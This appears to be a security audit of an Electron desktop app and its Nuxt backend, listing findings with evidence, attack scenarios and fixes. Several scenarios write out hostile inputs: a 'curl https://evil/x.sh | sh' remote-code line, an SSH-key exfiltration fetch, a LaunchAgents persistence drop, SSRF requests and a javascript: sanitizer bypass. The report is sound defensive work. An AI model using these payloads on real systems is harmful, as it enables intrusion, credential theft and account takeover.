title: Plugin channel is not isolated: transport.on registers every handler on the plugin channel too
summary: TuffMainTransport.on() registers the identical handler under both BRIDGE_CHANNEL.MAIN and BRIDGE_CHANNEL.PLUGIN, and the plugin-view preload's send() accepts an arbitrary event name, so a plugin surface can invoke any main-process transport handler in the app -- the ChannelType.MAIN/PLUGIN split provides no authorization boundary at all.
failure_scenario: channel-core.ts:261 forces `type: ChannelType.PLUGIN` for any message from a registered plugin webContents, which reads like a containment boundary. But because every handler is also registered on the PLUGIN map, containment is void. apps/core-app/src/preload/plugin-view.ts:71 exposes `contextBridge.exposeInMainWorld('$channel', {regChannel, unRegChannel, send})` and plugin-view-channel.ts:225 `send(eventName, payload)` puts the caller-chosen `eventName` straight on the wire with no allowlist. Any plugin page therefore calls `window.$channel.send('<any main event name>', payload)` and reaches handlers that were never meant for plugins -- concretely the download, network, terminal and shell handlers reported separately below. Only the six main-process files that call withPermission/enforcePermission resist this.
recommendation: Register handlers on the plugin channel only when the event is explicitly declared plugin-facing (an opt-in flag on TuffEvent), and default every other handler to the main channel alone.

title: Download task handler writes to any caller-supplied destination and filename
summary: addTask takes `destination` and `filename` verbatim from the IPC payload with no normalization, allowlist or traversal check; the worker then mkdir -p's the directory and opens a write stream there. registerSafeHandler is only an error-swallowing wrapper, not a permission gate.
evidence:
const destination = request.destination || this.config.storage.defaultDestination
...
      filename: request.filename || path.basename(request.url),
evidence_extra: download-worker.ts:371-409 `const outputPath = path.join(task.destination, task.filename)` / `await fs.mkdir(path.dirname(outputPath), { recursive: true })` / `const writeStream = createWriteStream(outputPath, { flags: 'w' })`
failure_scenario: A plugin (via window.$channel.send, since transport.on also registers on the plugin channel) or any injected renderer script sends DownloadEvents.task.add with `{url: 'https://attacker/payload', destination: '/Users/<victim>/Library/LaunchAgents', filename: 'com.evil.plist'}`. The worker creates the directory if needed and writes the attacker's HTTP response there, giving arbitrary file write anywhere the app process can reach -- login-item persistence on macOS, the Startup folder on Windows, or overwriting the app's own config/plugin files. `filename` is equally unchecked, so `../../..` traversal works even against a fixed destination.
recommendation: Resolve destination+filename with resolveSafePath against an allowlist of download roots, reject traversal and absolute filenames, and gate the event on the already-declared network.download permission.

title: NetworkEvents.api.request is an unauthenticated SSRF proxy for plugins
summary: The network module forwards the whole request object to the HTTP service with no URL validation and no permission check, even though the permission registry declares network.local, network.internet and network.download for exactly this capability.
failure_scenario: installPluginViewNavigationPolicy (plugin-window-policy.ts:555) carefully confines a plugin view's own network to its plugin root via session.webRequest.onBeforeRequest. A plugin simply bypasses that by calling `window.$channel.send('<network api request event>', {method:'GET', url:'http://127.0.0.1:8080/admin'})`: the request is issued by the main process, outside the view's session, with the user's LAN position and no origin restrictions. That reaches localhost-only admin panels, 169.254.169.254 metadata endpoints and internal hosts, and the response body is returned to the plugin. No withPermission wrapper exists on any of these three handlers, so the declared network.* permissions are never consulted.
recommendation: Wrap the request/readText/readBinary handlers in withPermission for network.internet / network.local and block requests to loopback, link-local and private ranges unless network.local was granted.

title: Markdown sanitizer href/src protocol check bypassed by `/` attribute separator
summary: sanitizeMarkdownHtml strips on*/style attributes with `[\s/]+` (explicitly handling the `/` separator) but the href/src protocol allowlist uses `\s+`, so `<a/href="javascript:...">` is never inspected and survives sanitization verbatim.
failure_scenario: Verified by executing the exact regex chain from this file: `x` is correctly reduced to `x`, but `x` is returned unchanged, and browsers parse `/` as a valid attribute-name separator. renderMarkdownToSafeHtml feeds GitHub release-notes bodies into UpdatePromptDialog.vue:200 `v-html="renderedMarkdown"` and plugin-store READMEs into SharedPluginDetailReadme.vue:22. An attacker controlling a release body or a published plugin README ships that anchor; the user clicks it in the privileged renderer, and since the CSP allows 'unsafe-inline' the javascript: URL executes with full ipcRenderer access -- from which the openApp/executeCommand/download handlers below give local code execution.
recommendation: Change both href/src regexes to `[\s/]+` to match the on-handler pattern, and replace the regex sanitizer with DOMPurify.

title: system.openApp transport handler passes unvalidated path to shell.openPath
summary: The AppEvents.system.openApp handler takes appName or path straight from the IPC payload and hands it to shell.openPath with no allowlist, extension check or path validation, and no permission wrapper.
failure_scenario: Any plugin (transport.on also registers on the plugin channel) or injected renderer script sends system.openApp with `{path: '/Users/<victim>/Library/Caches/payload.command'}` -- a file it can drop first via the unvalidated download handler. shell.openPath asks the OS to open it, which on macOS/Windows executes it outside the Electron sandbox. Nothing here consults the permission module, and even withPermission would not help a renderer caller because channel-guard.ts:126 returns early when there is no plugin id.
recommendation: Validate the target against a resolved allowlist of installed application bundles, reject non-application extensions, and require explicit user confirmation for anything outside it.

title: system.executeCommand handler opens any caller-supplied path with no validation
summary: AppEvents.system.executeCommand accepts an arbitrary command string and passes it to shell.openPath. Its registerSafeHandler wrapper is createSafeOperationHandler (common.ts:1225), which only reports errors -- it performs no permission or identity check.
failure_scenario: A plugin calls window.$channel.send with the system.executeCommand event name and `{command: '<path to a .command/.bat/.app it wrote via the download handler>'}`. shell.openPath hands the path to the OS shell association and it runs. The handler restricts the path to nothing -- not a config directory, not an app bundle, not a known extension -- despite the event name implying a vetted command surface.
recommendation: Either delete the event or restrict it to a fixed enum of internal actions; never pass a caller-supplied string to shell.openPath.

title: will-navigate hands any URL, including file:, to shell.openExternal without confirmation
summary: TouchWindow's will-navigate listener forwards every blocked navigation URL to this handler, which explicitly allows the file protocol and then calls shell.openExternal. The 'confirm' decision is never actually confirmed -- it logs and opens anyway.
failure_scenario: apps/core-app/src/main/core/touch-window.ts:93 emits OPEN_EXTERNAL_URL for every will-navigate URL before preventing the navigation. A link or script in the renderer navigating to `file:///Users/<victim>/Library/Caches/payload.command` triggers will-navigate; getOpenUrlDecision returns 'open' for the file protocol and shell.openExternal executes it through the OS handler. Every other protocol falls into the 'confirm' branch at line 1083, which despite its name shows no dialog and reaches shell.openExternal at line 1095, so arbitrary custom-scheme handlers registered on the machine can also be invoked.
recommendation: Route this through validateExternalUrl (already restricts to http/https/mailto/tel/tuff), drop the file special case, and implement a real confirmation dialog for the 'confirm' branch.

title: Terminal write/kill IPC handlers have no permission guard and no session ownership check
summary: Only TerminalEvents.session.create is wrapped in withPermission('system.shell'); write and kill are registered bare, and neither checks that the caller owns the session id it names.
failure_scenario: A plugin denied (or never granted) system.shell cannot call session.create, but it can call session.write with any id. `this.processes` is a single global map keyed only by id, and write() does `this.processes.get(id).stdin.write(data)` (line 148) with no comparison against the requesting webContents or plugin identity. The plugin races or brute-forces an id (format `proc_${Date.now()}_${9 base36 chars}`) for a session the host or another plugin started and writes `curl https://evil/x.sh | sh\n` into that process's stdin -- obtaining exactly the capability the permission gate exists to withhold. kill() lets the same caller terminate anyone's session.
recommendation: Record the owning webContents/plugin identity alongside each spawned process and reject write/kill from any other caller; also wrap both handlers in withPermission('system.shell').

title: Renderer override installed even when release signature verification fails
summary: installRendererOverride computes the RSA signature verification result, logs a warning when it is invalid, then unconditionally falls through to extract and install the bundle. The checksum is likewise only verified when the artifact happens to declare one.
failure_scenario: An attacker who can influence the release feed (compromised release asset, hijacked signature URL, or an artifact published with neither sha256 nor signatureUrl) serves a renderer bundle. The sibling installer path resolveVerifiedInstallTask (lines 738-762) throws on a missing checksum, a missing signature URL or an invalid signature; this path only warns, so the zip is extracted into the renderer-override root and renderer-override.json is written with `enabled: true`. When the override is active the bundle runs as the app's renderer, which per channel-guard.ts:126 holds unguarded system.shell plus the shell.openPath and download handlers above.
recommendation: Make this path fail closed exactly like resolveVerifiedInstallTask: require both a checksum and a valid signature, and throw instead of warning.

title: Renderer CSP allows unsafe-inline, unsafe-eval and any remote origin
summary: The only CSP on the privileged renderer is `default-src *` with `script-src * 'unsafe-inline' 'unsafe-eval'` and `connect-src *`, so it provides no containment for injected script and no exfiltration limit.
evidence:
<meta
      http-equiv="Content-Security-Policy"
      content="
    default-src * blob: data: tfile: remix:;
    script-src * 'unsafe-inline' 'unsafe-eval' blob: data:;
    connect-src * ws: wss: blob: data: tfile:;
failure_scenario: This renderer is where src/preload/index.ts:139 publishes an unrestricted ipcRenderer via `contextBridge.exposeInMainWorld('electron', electronAPI)`, and where channel-guard.ts:126 grants every non-plugin caller all permissions. Any injected markup -- for example the `<a/href="javascript:...">` that survives the markdown sanitizer when rendering GitHub release notes -- executes because 'unsafe-inline' permits javascript: URLs and inline handlers. It then reaches system.openApp / system.executeCommand / DownloadEvents.task.add / terminal.session.create for local code execution, and `connect-src *` lets it POST the results to any host.
recommendation: Drop 'unsafe-inline' and 'unsafe-eval', restrict default-src/script-src to 'self' plus the app's own schemes, and enumerate connect-src to the Nexus origin.

title: tfile:// protocol allowlist covers the entire user home directory
summary: getAllowedLocalFileRoots returns app.getPath('home') as an allowed root, so the tfile: custom protocol registered on the default session will serve any file under the user's home directory, not just icons and app assets.
evidence:
const candidates = [
    options.includeCwd ? process.cwd() : null,
    appPathSafe('home'),
    appPathSafe('userData'),
    appPathSafe('temp'),
failure_scenario: The renderer CSP explicitly whitelists `tfile:` in default-src, connect-src and img-src. Injected renderer script (see the markdown sanitizer bypass) runs `await (await fetch('tfile:///Users/<victim>/.ssh/id_rsa')).text()`; isAllowedLocalFilePath passes because the path sits under the home root, and `connect-src *` lets the result be exfiltrated. The same works for ~/.aws/credentials, browser cookie databases and the app's own secure-store files.
recommendation: Narrow the roots to the directories the protocol actually needs (userData, temp, /Applications icon paths) and drop the blanket home-directory root.

title: Permission guard allows any API name that is missing from the mapping table
summary: PermissionGuard.check() returns allowed:true whenever an API name matches no entry in API_PERMISSION_MAPPINGS, so the permission model is an opt-in denylist keyed on a hand-maintained string table rather than a default-deny gate.
failure_scenario: API_PERMISSION_MAPPINGS (lines 52-126) enumerates colon-separated names such as 'network:request' and 'system:exec'. Any capability whose call site passes a name not in that list -- including every capability added since the table was last updated -- is granted unconditionally to any plugin. Combined with the fact that only six main-process files call withPermission/enforcePermission at all, a plugin's manifest permission declarations bound almost nothing: the network, download, terminal-write and shell handlers reported above never reach this function in the first place, and anything that does reach it with an unmapped name is waved through.
recommendation: Default-deny: return allowed:false for unmapped API names and require every guarded call site to name a permission explicitly, with a test that fails when a transport event has no mapping.

title: Session-signing AUTH_SECRET committed to the repository in apps/nexus/.env
summary: apps/nexus/.env is tracked in git (confirmed via `git ls-files`) and pins AUTH_SECRET to a fixed placeholder. Nuxt loads .env automatically, so any build or runtime that does not explicitly override the variable signs sessions with a value published in the repo.
evidence:
AUTH_SECRET=dev-secret-change-me
AUTH_ORIGIN=http://localhost:3200
GITHUB_CLIENT_ID=
GITHUB_CLIENT_SECRET=
RESEND_API_KEY=
AUTH_EMAIL_FROM=hello@tuff.app
failure_scenario: nuxt.config.ts:73 reads `process.env.AUTH_SECRET || (isDev ? 'tuff-dev-secret' : undefined)`, and Nuxt populates process.env from this committed .env before that line runs. Any deployment or developer environment that relies on the checked-in file rather than an explicit secret gets a session-signing key that every reader of the repository knows, letting them forge session cookies. The same file establishes the habit of storing GITHUB_CLIENT_SECRET and RESEND_API_KEY in a tracked file.
recommendation: Remove apps/nexus/.env from git, add it to .gitignore alongside the existing `.env*.local` rule, ship a .env.example with empty values, and rotate AUTH_SECRET wherever this file was ever used.

title: LinuxDO OAuth links unverified third-party email to existing accounts (takeover)
summary: The LinuxDO OAuth provider sets allowDangerousEmailAccountLinking: true while its profile() mapper takes profile.email straight from the third-party /api/user response with no email_verified or ownership check, so an attacker-controlled LinuxDO account claiming a victim's email is auto-linked into the victim's existing Nexus account.
evidence:
allowDangerousEmailAccountLinking: true,   // line 619
...
          email: profile.email ?? null,           // line 661
...
          const email = user?.email ?? (profile as any)?.email   // line 698
          if (!email) return true
          const existing = await getUserByEmail(authEvent, email)
          if (!existing) return true
          return Boolean(await restoreForInteractiveSignIn(authEvent, existing.id))  // line 702
failure_scenario: Attacker sets or claims victim@example.com on an account at the LinuxDO issuer, then clicks Sign in with LinuxDO on Nexus. userinfo returns {email:'victim@example.com'} unverified -> profile() passes it through -> the signIn callback finds the existing Nexus user and returns true -> next-auth links the OAuth account to that user id and issues a session. The attacker now controls the victim's Nexus account, including an admin-role account, without ever proving control of the mailbox.
recommendation: Set allowDangerousEmailAccountLinking: false for linuxdo, or require an explicit email_verified === true claim plus an in-app confirmation step before linking an OAuth identity to a pre-existing local user.

title: GitHub email selection falls back to an unverified address before account linking
summary: The GitHub userinfo handler's third fallback picks any address from /user/emails with no verified === true requirement, and that address is then used for allowDangerousEmailAccountLinking at line 529.
failure_scenario: Attacker adds victim@example.com to their GitHub account without confirming it and keeps the public profile email null. If no verified address is returned by /user/emails, the first two find() branches miss and the third selects the unverified victim address. profile.email becomes the victim's address, the signIn callback at line 700 matches the existing Nexus user, and allowDangerousEmailAccountLinking: true links the attacker's GitHub identity to the victim's account.
recommendation: Delete the third fallback so only verified === true addresses are accepted; if no verified address exists, fail the sign-in.

title: Subscription activation codes generated with Math.random (predictable)
summary: Paid-plan activation codes are built from Math.random() instead of a CSPRNG, so the full code space is derivable from the V8 xorshift128+ state once a few codes are observed.
failure_scenario: An attacker obtains a handful of codes minted in the same batch (buys two, or reads codes from a public promo), recovers the V8 PRNG state from the consecutive Math.random() outputs, and reconstructs every other code produced by that isolate. They then POST each predicted code to /api/subscription/activate (no rate limiting, only a verified email required) and activateCode grants PRO/PLUS/TEAM/ENTERPRISE subscriptions for free.
recommendation: Generate codes with crypto.getRandomValues/randomBytes and add per-user rate limiting plus lockout on /api/subscription/activate.

title: Unauthenticated telemetry endpoint accepts an attacker-chosen userId
summary: /api/telemetry/record (and /api/telemetry/batch line 43) has no auth guard -- only IP rate limiting -- yet writes the client-supplied userId verbatim into telemetry_events.user_id and uses it as the platform-governance actorId.
evidence:
await recordTelemetryEvent(event, {
    eventType,
    userId: userId || undefined,
    clientId: clientId || undefined,
failure_scenario: An unauthenticated attacker POSTs {"eventType":"visit","userId":"<victim-user-id>","metadata":{...}} to /api/telemetry/record. recordTelemetryEvent binds it to user_id (telemetryStore.ts:245) and derives actorId (line 229) for recordPlatformGovernanceEvent. The victim then sees forged activity in GET /api/dashboard/telemetry/me, admin COUNT(DISTINCT user_id) dashboards are inflated, and governance/abuse attribution points at the victim.
recommendation: Ignore any client-supplied userId -- resolve it from getOptionalAuth(event) and store client-supplied identifiers only in the anonymous client_id/device_fingerprint columns.

title: Scene asset download performs no ownership check on the asset key
summary: The handler calls requireAuthOrApiKey(event) with no scopes and then serves the asset for any well-formed key, never checking that the referenced scene run belongs to the calling user -- unlike its siblings plugins/assets/[key].get.ts and v1/sync/blobs/[blob_id]/download.get.ts, which do scope by owner.
failure_scenario: Any registered user (or the holder of any API key, including a self-issued plugin:publish key from /api/dashboard/api-keys, since requiredScopes is empty so requireApiKey enforces neither scope nor role) can GET /api/v1/scenes/assets/scene_run_<uuid>.<ext> for another user's run and receive its full body. The only barrier is the secrecy of the run UUID, which leaks through referrers, shared links and proxy/CDN logs -- there is no server-side authorization at all.
recommendation: Look up the scene run that owns the key and reject when its owner id does not match the authenticated user (allowing admins explicitly), mirroring v1/sync/blobs/[blob_id]/download.get.ts.

title: Release download signature verification is a no-op under default config
summary: An invalid or expired sig/exp pair is accepted whenever allowUnsignedFallback is true, and that flag defaults to true (RELEASE_DOWNLOAD_ALLOW_UNSIGNED_FALLBACK !== 'false' in nuxt.config.ts:271), so the signed-URL control never rejects anything unless an operator opts in.
failure_scenario: Anyone requests /api/releases/<tag>/download/<platform>/<arch>?exp=1&sig=<64 arbitrary hex chars>. verifyReleaseDownloadSignature returns {valid:false, reason:'expired'}, but because allowUnsignedFallback defaults to true the branch is skipped and the asset is served. The TTL produced by createSignedReleaseDownloadPath is therefore never enforced and expired links keep working indefinitely.
recommendation: Fail closed: when a signature is supplied it must verify regardless of the fallback flag, and default allowUnsignedFallback to false.

title: Hardcoded fallback signing secret for doc analytics tokens
summary: getDocTokenSecret() falls back to the literal 'nexus-doc-analytics-fallback-secret-v1' when no candidate is >=16 chars, and unlike every other secret in the codebase it never goes through assertRuntimeCredential/readCloudflareBindings, so a Cloudflare Pages deploy that supplies secrets purely as bindings silently signs with the constant.
evidence:
tokenSecretCache = 'nexus-doc-analytics-fallback-secret-v1'
  return tokenSecretCache
failure_scenario: On Cloudflare Pages secrets arrive as event.context.cloudflare.env bindings; this function only reads useRuntimeConfig() and process.env, so all four candidates are undefined and the hardcoded constant is used. An attacker who reads this repo can then mint valid doc tokens (createDocToken payloads are attacker-chosen sid/path/cid/rl) and pass the verifyDocToken gate at api/docs/engagement.post.ts:122, defeating the anti-tamper layer on doc engagement analytics. The comparison at line 277 is also non-constant-time, and line 252 uses SHA256(input + '.' + secret) rather than HMAC.
recommendation: Route this secret through readCloudflareBindings + assertRuntimeCredential, delete the hardcoded fallback, and switch to createHmac('sha256', secret) with timingSafeEqual.

title: Unauthenticated account-existence oracle at /api/auth/email-status
summary: The endpoint has no auth guard, no Turnstile check and no rate limiting (no global middleware applies one -- server/middleware only does CORS, canonical-origin, docs redirect, feature gates and credential assertion), yet returns whether an arbitrary email is registered and its account status.
failure_scenario: An attacker scripts GET /api/auth/email-status?email=<candidate> over a breach list and gets a clean exists:true/false plus status (active/disabled/pending deletion) for every address, with no throttle. The same oracle is duplicated at api/passkeys/options.get.ts:10, which additionally returns the victim's registered passkey credential ids. The harvested list feeds credential stuffing and the OAuth-linking takeover above.
recommendation: Require a Turnstile token (as /api/auth/register does) and apply per-IP rate limiting, or return a constant response and move the existence signal behind the verified sign-in flow.

title: Unauthenticated endpoint decrements any plugin's public install counter
summary: /api/store/uninstall has no auth guard, no rate limit and no proof that the caller ever installed the plugin; it decrements the store-wide installs counter for whatever slug is posted.
failure_scenario: An anonymous attacker loops POST /api/store/uninstall {"slug":"competitor-plugin"}. Each call runs UPDATE plugins SET installs = MAX(0, installs - 1) (pluginsStore.ts:3424), so the publicly displayed install count for any plugin can be driven to 0 within seconds while the attacker leaves their own plugin's count untouched -- direct manipulation of store social proof.
recommendation: Require an authenticated session or app token, record uninstalls per (user, device, plugin) so a decrement can only undo a prior install by that identity, and rate-limit the endpoint.

title: Admin passkey step-up accepts a presence-only assertion (userVerified discarded)
summary: verifyAssertionResponse returns userVerified (webauthn.ts:325) but the handler drops it and mints a login token anyway; combined with userVerification: 'preferred' at passkeys/options.get.ts:33, the token that requireAdminStepUp and the control-plane channel-A guard treat as second-factor proof can be produced without any PIN or biometric.
failure_scenario: Someone who obtains an admin's hardware security key with no PIN configured calls the unauthenticated POST /api/passkeys/verify with a presence-only assertion (UV flag clear). The handler ignores result.userVerified, issues a 10-minute login token, and that token satisfies consumeLoginToken(event, loginToken, 'passkey') in requireAdminStepUp (auth.ts:439) and requireAdminSessionChannel (adminControlPlaneGuard.ts:243). The 'Passkey step-up required' control on risk/emergency admin actions is passed with a single key touch and no second factor.
recommendation: Set userVerification: 'required' in the options endpoint and reject the assertion when result.userVerified is false for step-up-eligible tokens.
